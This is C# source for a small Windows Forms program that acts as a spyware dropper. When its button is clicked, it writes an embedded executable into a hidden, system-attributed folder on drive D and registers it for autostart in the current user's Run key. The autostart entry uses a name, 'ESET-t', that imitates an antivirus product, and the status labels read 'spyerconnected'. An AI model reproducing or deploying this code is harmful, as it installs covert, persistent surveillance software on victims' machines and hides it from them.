using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using System.IO;
using Microsoft.Win32;

namespace withness03
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }
        [System.Runtime.InteropServices.DllImport("kernel32")]
        private static extern int Sleep(long dwTime);

        RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);

        private void btn_Doo_Click(object sender, EventArgs e)
        {
            lbl_S.Text = "";
            btn_Doo.Visible = false;
            lbl_S.Visible = true;
            this.Refresh();
            Sleep(100);
            if (!(Directory.Exists(@"D:\TAT")))
                Directory.CreateDirectory(@"D:\TAT");
            lbl_S.Text += "dbcreated\n";
            this.Refresh();
            Sleep(100);
            if (!(Directory.Exists(@"D:\TAT\T.S.2")))
                Directory.CreateDirectory(@"D:\TAT\T.S.2");
            lbl_S.Text += "db2created\n";
            this.Refresh();
            Sleep(100);
            File.SetAttributes(@"D:\TAT\T.S.2", FileAttributes.Hidden | FileAttributes.System);
            lbl_S.Text += "dbshide\n";
            this.Refresh();
            Sleep(50);
            File.WriteAllBytes(@"D:\TAT\T.S.2\TAT.School.2.exe", Properties.Resources.TAT_School);
            lbl_S.Text += "spyerconnected\n";
            this.Refresh();
            Sleep(40);
            registryKey.SetValue("ESET-t", @"D:\TAT\T.S.2\TAT.School.2.exe");
            lbl_S.Text += "aotuconfirmed\n";
            this.Refresh();
            Sleep(150);
            lbl_S.Text += "DONE";
            MessageBox.Show(this, "Done", "Done", MessageBoxButtons.OK, MessageBoxIcon.Information);
            Application.Exit();
        }
    }
}
